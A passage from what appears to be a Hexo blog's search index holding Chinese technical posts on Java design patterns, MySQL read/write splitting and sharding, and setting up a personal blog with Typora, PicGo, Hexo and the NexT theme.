class="keyword">class</span> <span class="title class_">ConcreteFactory2</span> <span class="keyword">implements</span> <span class="title class_">AbstractFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Product <span class="title function_">newProduct</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;具体工厂2生成--&gt;具体产品2...&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ConcreteProduct2</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> FactoryMethod;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.*;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReadXML1</span> &#123;</span><br><span class="line">    <span class="comment">//该方法用于从XML配置文件中提取具体类类名，并返回一个实例对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//创建文档对象</span></span><br><span class="line">            <span class="type">DocumentBuilderFactory</span> <span class="variable">dFactory</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">            <span class="type">DocumentBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> dFactory.newDocumentBuilder();</span><br><span class="line">            Document doc;</span><br><span class="line">            doc = builder.parse(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;src/FactoryMethod/config1.xml&quot;</span>));</span><br><span class="line">            <span class="comment">//获取包含类名的文本节点</span></span><br><span class="line">            <span class="type">NodeList</span> <span class="variable">nl</span> <span class="operator">=</span> doc.getElementsByTagName(<span class="string">&quot;className&quot;</span>);</span><br><span class="line">            <span class="type">Node</span> <span class="variable">classNode</span> <span class="operator">=</span> nl.item(<span class="number">0</span>).getFirstChild();</span><br><span class="line">            <span class="type">String</span> <span class="variable">cName</span> <span class="operator">=</span> <span class="string">&quot;FactoryMethod.&quot;</span> + classNode.getNodeValue();</span><br><span class="line">            <span class="comment">//System.out.println(&quot;新类名：&quot;+cName);</span></span><br><span class="line">            <span class="comment">//通过类名生成实例对象并将其返回</span></span><br><span class="line">            Class&lt;?&gt; c = Class.forName(cName);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> c.newInstance();</span><br><span class="line">            <span class="keyword">return</span> obj;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="抽象工厂模式"><a href="#抽象工厂模式" class="headerlink" title="抽象工厂模式"></a>抽象工厂模式</h3><p>抽象工厂模式是工厂方法模式的升级版本，工厂方法模式只生产一个等级的产品，而抽象工厂模式可生产多个等级的产品。</p>
<h2 id="建造者模式-Builder-Pattern"><a href="#建造者模式-Builder-Pattern" class="headerlink" title="建造者模式(Builder Pattern)"></a>建造者模式(Builder Pattern)</h2><p>用来创建复杂的复合对象</p>
<h2 id="代理模式-Proxy-Pattern"><a href="#代理模式-Proxy-Pattern" class="headerlink" title="代理模式(Proxy Pattern)"></a>代理模式(Proxy Pattern)</h2><p>为其他对象提供一种代理以控制对这个对象的访问</p>
<h2 id="外观模式-Facade-Pattern"><a href="#外观模式-Facade-Pattern" class="headerlink" title="外观模式(Facade Pattern)"></a>外观模式(Facade Pattern)</h2><p>对外提供一个统一的接口用来访问子系统</p>
<h2 id="装饰器模式（Decorator-Pattern）"><a href="#装饰器模式（Decorator-Pattern）" class="headerlink" title="装饰器模式（Decorator Pattern）"></a>装饰器模式（Decorator Pattern）</h2><p>为对象添加新功能</p>
<h2 id="享元模式（Flyweight-Pattern）"><a href="#享元模式（Flyweight-Pattern）" class="headerlink" title="享元模式（Flyweight Pattern）"></a>享元模式（Flyweight Pattern）</h2><p>使用对象池来减少重复对象的创建</p>
<h2 id="组合模式（Composite-Pattern）"><a href="#组合模式（Composite-Pattern）" class="headerlink" title="组合模式（Composite Pattern）"></a>组合模式（Composite Pattern）</h2><p>将整体与局部（树形结构）进行递归组合，让客户端能够以一种的方式对其进行处理</p>
<h2 id="适配器模式（Adapter-Pattern）"><a href="#适配器模式（Adapter-Pattern）" class="headerlink" title="适配器模式（Adapter Pattern）"></a>适配器模式（Adapter Pattern）</h2><p>将原来不兼容的两个类融合在一起</p>
<h2 id="桥接模式（Bridge-Pattern）"><a href="#桥接模式（Bridge-Pattern）" class="headerlink" title="桥接模式（Bridge Pattern）"></a>桥接模式（Bridge Pattern）</h2><p>将两个能够独立变化的部分分离开来</p>
<h2 id="模板模式（Template-Pattern）"><a href="#模板模式（Template-Pattern）" class="headerlink" title="模板模式（Template Pattern）"></a>模板模式（Template Pattern）</h2><p>定义一套流程模板，根据需要实现模板中的操作</p>
<h2 id="策略模式（Strategy-Pattern）"><a href="#策略模式（Strategy-Pattern）" class="headerlink" title="策略模式（Strategy Pattern）"></a>策略模式（Strategy Pattern）</h2><p>封装不同的算法，算法之间能互相替换</p>
<h2 id="责任链模式（Chain-of-Responsibility-Pattern）"><a href="#责任链模式（Chain-of-Responsibility-Pattern）" class="headerlink" title="责任链模式（Chain of Responsibility Pattern）"></a>责任链模式（Chain of Responsibility Pattern）</h2><p>拦截的类都实现统一接口，每个接收者都包含对下一个接收者的引用。将这些对象连接成一条链，并且沿着这条链传递请求，直到有对象处理它为止。</p>
<h2 id="迭代器模式（Iterator-Pattern）"><a href="#迭代器模式（Iterator-Pattern）" class="headerlink" title="迭代器模式（Iterator Pattern）"></a>迭代器模式（Iterator Pattern）</h2><p>提供一种方法顺序访问一个聚合对象中的各个元素</p>
<h2 id="命令模式（Command-Pattern）"><a href="#命令模式（Command-Pattern）" class="headerlink" title="命令模式（Command Pattern）"></a>命令模式（Command Pattern）</h2><p> 将请求封装成命令，并记录下来，能够撤销与重做</p>
<h2 id="状态模式（State-Pattern）"><a href="#状态模式（State-Pattern）" class="headerlink" title="状态模式（State Pattern）"></a>状态模式（State Pattern）</h2><p>根据不同的状态做出不同的行为</p>
<h2 id="备忘录模式（Memento-Pattern）"><a href="#备忘录模式（Memento-Pattern）" class="headerlink" title="备忘录模式（Memento Pattern）"></a>备忘录模式（Memento Pattern）</h2><p>保存对象的状态，在需要时进行恢复</p>
<h2 id="中介者模式（Mediator-Pattern）"><a href="#中介者模式（Mediator-Pattern）" class="headerlink" title="中介者模式（Mediator Pattern）"></a>中介者模式（Mediator Pattern）</h2><p>将对象之间的通信关联关系封装到一个中介类中单独处理，从而使其耦合松散</p>
<h2 id="解释器模式（Interpreter-Pattern）"><a href="#解释器模式（Interpreter-Pattern）" class="headerlink" title="解释器模式（Interpreter Pattern）"></a>解释器模式（Interpreter Pattern）</h2><p>给定一个语言，定义它的语法表示，并定义一个解释器，这个解释器使用该标识来解释语言中的句子</p>
<h2 id="观察者模式（Observer-Pattern）"><a href="#观察者模式（Observer-Pattern）" class="headerlink" title="观察者模式（Observer Pattern）"></a>观察者模式（Observer Pattern）</h2><p>状态发生改变时通知观察者，一对多的关系</p>
<h2 id="访问者模式（Visitor-Pattern）"><a href="#访问者模式（Visitor-Pattern）" class="headerlink" title="访问者模式（Visitor Pattern）"></a>访问者模式（Visitor Pattern）</h2><p>稳定数据结构，定义新的操作行为</p>
<h2 id="委派模式（Delegate-Pattern）"><a href="#委派模式（Delegate-Pattern）" class="headerlink" title="委派模式（Delegate Pattern）"></a>委派模式（Delegate Pattern）</h2><p>允许对象组合实现与继承相同的代码重用，负责任务的调用和分配</p>
]]></content>
      <categories>
        <category>base</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>读写分离&amp;分库分表</title>
    <url>/2022/03/22/%E8%AF%BB%E5%86%99%E5%88%86%E7%A6%BB-%E5%88%86%E5%BA%93%E5%88%86%E8%A1%A8/</url>
    <content><![CDATA[<h1 id="读写分离-amp-分库分表"><a href="#读写分离-amp-分库分表" class="headerlink" title="读写分离&amp;分库分表"></a>读写分离&amp;分库分表</h1><h2 id="读写分离"><a href="#读写分离" class="headerlink" title="读写分离"></a>读写分离</h2><h3 id="何为读写分离？"><a href="#何为读写分离？" class="headerlink" title="何为读写分离？"></a>何为读写分离？</h3><p>见名思意，根据读写分离的名字，我们就可以知道：读写分离主要是为了将对数据库的读写操作分散到不同的数据库节点上。 这样的话，就能够小幅提升写性能，大幅提升读性能。</p>
<p>我简单画了一张图来帮助不太清楚读写分离的小伙伴理解。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203221711062.png" alt="img"></p>
<p>一般情况下，我们都会选择一主多从，也就是一台主数据库负责写，其他的从数据库负责读。主库和从库之间会进行数据同步，以保证从库中数据的准确性。这样的架构实现起来比较简单，并且也符合系统的写少读多的特点。</p>
<h3 id="读写分离会带来什么问题？如何解决？"><a href="#读写分离会带来什么问题？如何解决？" class="headerlink" title="读写分离会带来什么问题？如何解决？"></a>读写分离会带来什么问题？如何解决？</h3><p>读写分离对于提升数据库的并发非常有效，但是，同时也会引来一个问题：主库和从库的数据存在延迟，比如你写完主库之后，主库的数据同步到从库是需要时间的，这个时间差就导致了主库和从库的数据不一致性问题。这也就是我们经常说的 主从同步延迟 。</p>
<p>主从同步延迟问题的解决，没有特别好的一种方案（可能是我太菜了，欢迎评论区补充）。你可以根据自己的业务场景，参考一下下面几种解决办法。</p>
<p>1.强制将读请求路由到主库处理。</p>
<p>既然你从库的数据过期了，那我就直接从主库读取嘛！这种方案虽然会增加主库的压力，但是，实现起来比较简单，也是我了解到的使用最多的一种方式。</p>
<p>比如 Sharding-JDBC 就是采用的这种方案。通过使用 Sharding-JDBC 的 HintManager 分片键值管理器，我们可以强制使用主库。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">HintManager</span> <span class="variable">hintManager</span> <span class="operator">=</span> HintManager.getInstance();</span><br><span class="line">hintManager.setMasterRouteOnly();</span><br><span class="line"><span class="comment">// 继续JDBC操作</span></span><br></pre></td></tr></table></figure>

<p>对于这种方案，你可以将那些必须获取最新数据的读请求都交给主库处理。</p>
<p>2.延迟读取。</p>
<p>还有一些朋友肯定会想既然主从同步存在延迟，那我就在延迟之后读取啊，比如主从同步延迟 0.5s,那我就 1s 之后再读取数据。这样多方便啊！方便是方便，但是也很扯淡。</p>
<p>不过，如果你是这样设计业务流程就会好很多：对于一些对数据比较敏感的场景，你可以在完成写请求之后，避免立即进行请求操作。比如你支付成功之后，跳转到一个支付成功的页面，当你点击返回之后才返回自己的账户。</p>
<p>另外，《MySQL 实战 45 讲》open in new window这个专栏中的《读写分离有哪些坑？》open in new window这篇文章还介绍了很多其他比较实际的解决办法，感兴趣的小伙伴可以自行研究一下。</p>
<h3 id="如何实现读写分离？"><a href="#如何实现读写分离？" class="headerlink" title="如何实现读写分离？"></a>如何实现读写分离？</h3><p>不论是使用哪一种读写分离具体的实现方案，想要实现读写分离一般包含如下几步：</p>
<ol>
<li>部署多台数据库，选择其中的一台作为主数据库，其他的一台或者多台作为从数据库。</li>
<li>保证主数据库和从数据库之间的数据是实时同步的，这个过程也就是我们常说的主从复制。</li>
<li>系统将写请求交给主数据库处理，读请求交给从数据库处理。</li>
</ol>
<p>落实到项目本身的话，常用的方式有两种：</p>
<p>1.代理方式</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203221714335.png" alt="读写分离-代理层"></p>
<p>我们可以在应用和数据中间加了一个代理层。应用程序所有的数据请求都交给代理层处理，代理层负责分离读写请求，将它们路由到对应的数据库中。</p>
<p>提供类似功能的中间件有 MySQL Router（官方）、Atlas（基于 MySQL Proxy）、Maxscale、MyCat。</p>
<p>2.组件方式</p>
<p>在这种方式中，我们可以通过引入第三方组件来帮助我们读写请求。</p>
<p>这也是我比较推荐的一种方式。这种方式目前在各种互联网公司中用的最多的，相关的实际的案例也非常多。如果你要采用这种方式的话，推荐使用 sharding-jdbc ，直接引入 jar 包即可使用，非常方便。同时，也节省了很多运维的成本。</p>
<p>你可以在 shardingsphere 官方找到sharding-jdbc 关于读写分离的操作open in new window。</p>
<h3 id="主从复制原理了解么？"><a href="#主从复制原理了解么？" class="headerlink" title="主从复制原理了解么？"></a>主从复制原理了解么？</h3><p>MySQL binlog(binary log 即二进制日志文件) 主要记录了 MySQL 数据库中数据的所有变化(数据库执行的所有 DDL 和 DML 语句)。因此，我们根据主库的 MySQL binlog 日志就能够将主库的数据同步到从库中。</p>
<p>更具体和详细的过程是这个样子的（图片来自于：《MySQL Master-Slave Replication on the Same Machine》open in new window）：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203221720366.png" alt="MySQL主从复制"></p>
<ol>
<li>主库将数据库中数据的变化写入到 binlog</li>
<li>从库连接主库</li>
<li>从库会创建一个 I&#x2F;O 线程向主库请求更新的 binlog</li>
<li>主库会创建一个 binlog dump 线程来发送 binlog ，从库中的 I&#x2F;O 线程负责接收</li>
<li>从库的 I&#x2F;O 线程将接收的 binlog 写入到 relay log 中。</li>
<li>从库的 SQL 线程读取 relay log 同步数据本地（也就是再执行一遍 SQL ）。</li>
</ol>
<p>怎么样？看了我对主从复制这个过程的讲解，你应该搞明白了吧!</p>
<p>你一般看到 binlog 就要想到主从复制。当然，除了主从复制之外，binlog 还能帮助我们实现数据恢复。</p>
<p>🌈 拓展一下：</p>
<p>不知道大家有没有使用过阿里开源的一个叫做 canal 的工具。这个工具可以帮助我们实现 MySQL 和其他数据源比如 Elasticsearch 或者另外一台 MySQL 数据库之间的数据同步。很显然，这个工具的底层原理肯定也是依赖 binlog。canal 的原理就是模拟 MySQL 主从复制的过程，解析 binlog 将数据同步到其他的数据源。</p>
<p>另外，像咱们常用的分布式缓存组件 Redis 也是通过主从复制实现的读写分离。</p>
<p>🌕 简单总结一下：</p>
<p>MySQL 主从复制是依赖于 binlog 。另外，常见的一些同步 MySQL 数据到其他数据源的工具（比如 canal）的底层一般也是依赖 binlog 。</p>
<h2 id="分库分表"><a href="#分库分表" class="headerlink" title="分库分表"></a>分库分表</h2><p>读写分离主要应对的是数据库读并发，没有解决数据库存储问题。试想一下：如果 MySQL 一张表的数据量过大怎么办?</p>
<p>换言之，我们该如何解决 MySQL 的存储压力呢？</p>
<p>答案之一就是分库分表。</p>
<h3 id="何为分库？"><a href="#何为分库？" class="headerlink" title="何为分库？"></a>何为分库？</h3><p>分库就是将数据库中的数据分散到不同的数据库上。</p>
<p>下面这些操作都涉及到了分库：</p>
<ul>
<li>你将数据库中的用户表和用户订单表分别放在两个不同的数据库。</li>
<li>由于用户表数据量太大，你对用户表进行了水平切分，然后将切分后的 2 张用户表分别放在两个不同的数据库。</li>
</ul>
<h3 id="何为分表？"><a href="#何为分表？" class="headerlink" title="何为分表？"></a>何为分表？</h3><p>分表就是对单表的数据进行拆分，可以是垂直拆分，也可以是水平拆分。</p>
<p>何为垂直拆分？</p>
<p>简单来说，垂直拆分是对数据表列的拆分，把一张列比较多的表拆分为多张表。</p>
<p>举个例子：我们可以将用户信息表中的一些列单独抽出来作为一个表。</p>
<p>何为水平拆分？</p>
<p>简单来说，水平拆分是对数据表行的拆分，把一张行比较多的表拆分为多张表。</p>
<p>举个例子：我们可以将用户信息表拆分成多个用户信息表，这样就可以避免单一表数据量过大对性能造成影响。</p>
<p>《从零开始学架构》open in new window 中的有一张图片对于垂直拆分和水平拆分的描述还挺直观的。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203221722217.jpg" alt="img"></p>
<h3 id="什么情况下需要分库分表？"><a href="#什么情况下需要分库分表？" class="headerlink" title="什么情况下需要分库分表？"></a>什么情况下需要分库分表？</h3><p>遇到下面几种场景可以考虑分库分表：</p>
<ul>
<li>单表的数据达到千万级别以上，数据库读写速度比较缓慢（分表）。</li>
<li>数据库中的数据占用的空间越来越大，备份时间越来越长（分库）。</li>
<li>应用的并发量太大（分库）。</li>
</ul>
<h3 id="分库分表会带来什么问题呢？"><a href="#分库分表会带来什么问题呢？" class="headerlink" title="分库分表会带来什么问题呢？"></a>分库分表会带来什么问题呢？</h3><p>记住，你在公司做的任何技术决策，不光是要考虑这个技术能不能满足我们的要求，是否适合当前业务场景，还要重点考虑其带来的成本。</p>
<p>引入分库分表之后，会给系统带来什么挑战呢？</p>
<ul>
<li>join 操作 ： 同一个数据库中的表分布在了不同的数据库中，导致无法使用 join 操作。这样就导致我们需要手动进行数据的封装，比如你在一个数据库中查询到一个数据之后，再根据这个数据去另外一个数据库中找对应的数据。</li>
<li>事务问题 ：同一个数据库中的表分布在了不同的数据库中，如果单个操作涉及到多个数据库，那么数据库自带的事务就无法满足我们的要求了。</li>
<li>分布式 id ：分库之后， 数据遍布在不同服务器上的数据库，数据库的自增主键已经没办法满足生成的主键唯一了。我们如何为不同的数据节点生成全局唯一主键呢？这个时候，我们就需要为我们的系统引入分布式 id 了。</li>
<li>……</li>
</ul>
<p>另外，引入分库分表之后，一般需要 DBA 的参与，同时还需要更多的数据库服务器，这些都属于成本。</p>
<h3 id="分库分表有没有什么比较推荐的方案？"><a href="#分库分表有没有什么比较推荐的方案？" class="headerlink" title="分库分表有没有什么比较推荐的方案？"></a>分库分表有没有什么比较推荐的方案？</h3><p>ShardingSphere 项目（包括 Sharding-JDBC、Sharding-Proxy 和 Sharding-Sidecar）是当当捐入 Apache 的，目前主要由京东数科的一些巨佬维护。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203221723511.jpeg" alt="img"></p>
<p>ShardingSphere 绝对可以说是当前分库分表的首选！ShardingSphere 的功能完善，除了支持读写分离和分库分表，还提供分布式事务、数据库治理等功能。</p>
<p>另外，ShardingSphere 的生态体系完善，社区活跃，文档完善，更新和发布比较频繁。</p>
<p>艿艿之前写了一篇分库分表的实战文章，各位朋友可以看看：《芋道 Spring Boot 分库分表入门》open in new window 。</p>
<h3 id="分库分表后，数据怎么迁移呢？"><a href="#分库分表后，数据怎么迁移呢？" class="headerlink" title="分库分表后，数据怎么迁移呢？"></a>分库分表后，数据怎么迁移呢？</h3><p>分库分表之后，我们如何将老库（单库单表）的数据迁移到新库（分库分表后的数据库系统）呢？</p>
<p>比较简单同时也是非常常用的方案就是停机迁移，写个脚本老库的数据写到新库中。比如你在凌晨 2 点，系统使用的人数非常少的时候，挂一个公告说系统要维护升级预计 1 小时。然后，你写一个脚本将老库的数据都同步到新库中。</p>
<p>如果你不想停机迁移数据的话，也可以考虑双写方案。双写方案是针对那种不能停机迁移的场景，实现起来要稍微麻烦一些。具体原理是这样的：</p>
<ul>
<li>我们对老库的更新操作（增删改），同时也要写入新库（双写）。如果操作的数据不存在于新库的话，需要插入到新库中。 这样就能保证，咱们新库里的数据是最新的。</li>
<li>在迁移过程，双写只会让被更新操作过的老库中的数据同步到新库，我们还需要自己写脚本将老库中的数据和新库的数据做比对。如果新库中没有，那咱们就把数据插入到新库。如果新库有，旧库没有，就把新库对应的数据删除（冗余数据清理）。</li>
<li>重复上一步的操作，直到老库和新库的数据一致为止。</li>
</ul>
<p>想要在项目中实施双写还是比较麻烦的，很容易会出现问题。我们可以借助上面提到的数据库同步工具 Canal 做增量数据迁移（还是依赖 binlog，开发和维护成本较低）。</p>
]]></content>
      <categories>
        <category>base</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>阿里云+Typora+PicGo+Github+Hexo+Next主题搭建个人博客</title>
    <url>/2021/12/29/%E9%98%BF%E9%87%8C%E4%BA%91+Typora+PicGo+Github+Hexo+Next%E4%B8%BB%E9%A2%98%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<h1 id="阿里云-Typora-PicGo-Github-Hexo-Next主题搭建个人博客"><a href="#阿里云-Typora-PicGo-Github-Hexo-Next主题搭建个人博客" class="headerlink" title="阿里云+Typora+PicGo+Github+Hexo+Next主题搭建个人博客"></a>阿里云+Typora+PicGo+Github+Hexo+Next主题搭建个人博客</h1><ul>
<li>开通阿里云对象存储</li>
<li>下载Typora</li>
<li>下载Picgo</li>
<li>typora配置图片通过picgo上传</li>
<li>picgo配置阿里云的secretKey和secretId</li>
<li>安装hexo（需要先安装nodejs）</li>
<li>github新建仓库</li>
<li>Hexo配置发布到github或个人服务器（需要配置）</li>
<li>修改主题</li>
</ul>
<p>安装homebrew</p>
<h2 id="安装PicGo"><a href="#安装PicGo" class="headerlink" title="安装PicGo"></a>安装PicGo</h2><p><a href="https://github.com/Molunerfinn/PicGo">https://github.com/Molunerfinn/PicGo</a></p>
<p>配置阿里云图床</p>
<h2 id="发布博客"><a href="#发布博客" class="headerlink" title="发布博客"></a>发布博客</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">brew install node</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">github创建一个仓库</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装git</span></span><br><span class="line">brew install git</span><br><span class="line"></span><br><span class="line">git config --global user.name &quot;你的GitHub用户名&quot;</span><br><span class="line">git config --global user.email &quot;你的GitHub注册邮箱&quot;</span><br><span class="line"></span><br><span class="line">ssh-keygen -t rsa -C &quot;你的GitHub注册邮箱&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">然后直接三个回车即可，默认不需要设置密码</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">然后找到生成的.ssh的文件夹中的id_rsa.pub密钥，将内容全部复制到github</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">npm install -g hexo-cli</span><br><span class="line">hexo init blog</span><br><span class="line">cd blog</span><br><span class="line">npm install</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">访问不了github， 要翻墙</span></span><br><span class="line">hexo g</span><br><span class="line"></span><br><span class="line">hexo s</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改配置文件</span></span><br><span class="line"></span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">npm install --save hexo-renderer-jade hexo-generator-feed hexo-generator-sitemap hexo-browsersync hexo-generator-archive hexo-generator-searchdb</span><br><span class="line"></span><br><span class="line">npm install --save hexo-deployer-git</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hexo clean </span><br><span class="line">hexo g </span><br><span class="line">hexo d</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">github生成token，密码填token</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成Token的时候要设置权限</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置主题</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改配置文件blog/_config.yml</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Site</span></span><br><span class="line">title: YeChun</span><br><span class="line">subtitle: &#x27;I love mw.&#x27;</span><br><span class="line">description: &#x27;朝花夕拾 聊以记之&#x27;</span><br><span class="line">keywords:</span><br><span class="line">author: YeChunChen</span><br><span class="line">language: zh-CN</span><br><span class="line">timezone: &#x27;Asia/Shanghai&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">theme: next</span><br><span class="line"></span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: https://github.com/pure-cyc/pure-cyc.github.io.git</span><br><span class="line">  branch: master</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置主题</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">clash重新设置代理</span></span><br><span class="line">git config --global http.proxy http://127.0.0.1:7890</span><br><span class="line">git config --global https.proxy http://127.0.0.1:7890</span><br><span class="line">git clone https://github.com/next-theme/hexo-theme-next.git themes/next</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置next/_config.yml</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Remove unnecessary files after hexo generate.</span></span><br><span class="line">minify: true</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Schemes</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">scheme: Muse</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">scheme: Mist</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">scheme: Pisces</span></span><br><span class="line">scheme: Gemini</span><br><span class="line"></span><br><span class="line">menu:</span><br><span class="line">  home: / || fa fa-home</span><br><span class="line"><span class="meta prompt_">  #</span><span class="language-bash">about: /about/ || fa fa-user</span></span><br><span class="line">  tags: /tags/ || fa fa-tags</span><br><span class="line">  categories: /categories/ || fa fa-th</span><br><span class="line">  archives: /archives/ || fa fa-archive</span><br><span class="line"><span class="meta prompt_">  #</span><span class="language-bash">schedule: /schedule/ || fa fa-calendar</span></span><br><span class="line"><span class="meta prompt_">  #</span><span class="language-bash">sitemap: /sitemap.xml || fa fa-sitemap</span></span><br><span class="line"><span class="meta prompt_">  #</span><span class="language-bash">commonweal: /404/ || fa fa-heartbeat</span></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">social:</span><br><span class="line">  GitHub: https://github.com/pure-cyc || fab fa-github</span><br><span class="line"><span class="meta prompt_">  #</span><span class="language-bash">E-Mail: mailto:@gmail.com || fa fa-envelope</span></span><br><span class="line"><span class="meta prompt_">  #</span><span class="language-bash">Weibo: https://weibo.com/yourname || fab fa-weibo</span></span><br><span class="line"><span class="meta prompt_">  #</span><span class="language-bash">Google: https://plus.google.com/yourname || fab fa-google</span></span><br><span class="line"><span class="meta prompt_">  #</span><span class="language-bash">Twitter: https://twitter.com/yourname || fab fa-twitter</span></span><br><span class="line"><span class="meta prompt_">  #</span><span class="language-bash">FB Page: https://www.facebook.com/yourname || fab fa-facebook</span></span><br><span class="line"><span class="meta prompt_">  #</span><span class="language-bash">StackOverflow: https://stackoverflow.com/yourname || fab fa-stack-overflow</span></span><br><span class="line"><span class="meta prompt_">  #</span><span class="language-bash">YouTube: https://youtube.com/yourname || fab fa-youtube</span></span><br><span class="line"><span class="meta prompt_">  #</span><span class="language-bash">Instagram: https://instagram.com/yourname || fab fa-instagram</span></span><br><span class="line"><span class="meta prompt_">  #</span><span class="language-bash">Skype: skype:yourname?call|chat || fab fa-skype</span></span><br><span class="line">  </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Mermaid tag</span></span><br><span class="line">mermaid:</span><br><span class="line">  enable: true</span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">Available themes: default | dark | forest | neutral</span></span><br><span class="line">  theme:</span><br><span class="line">    light: default</span><br><span class="line">    dark: dark</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开启search</span></span><br><span class="line">npm install hexo-generator-searchdb</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">blog/_config.yml</span></span><br><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  content: true</span><br><span class="line">  format: html</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">next/——config.yml</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Local search</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Dependencies: https://github.com/next-theme/hexo-generator-searchdb</span></span><br><span class="line">local_search:</span><br><span class="line">  enable: true</span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">If auto, trigger search by changing input.</span></span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">If manual, trigger search by pressing enter key or search button.</span></span><br><span class="line">  trigger: auto</span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">Show top n results per article, show all results by setting to -1</span></span><br><span class="line">  top_n_per_article: 1</span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">Unescape html strings to the readable one.</span></span><br><span class="line">  unescape: false</span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">Preload the search data when the page loads.</span></span><br><span class="line">  preload: false</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">绑定域名</span></span><br><span class="line">cd blog/source</span><br><span class="line">vi CNAME</span><br><span class="line">blog.yc0623.asia</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编写脚本debug.sh</span></span><br><span class="line">hexo 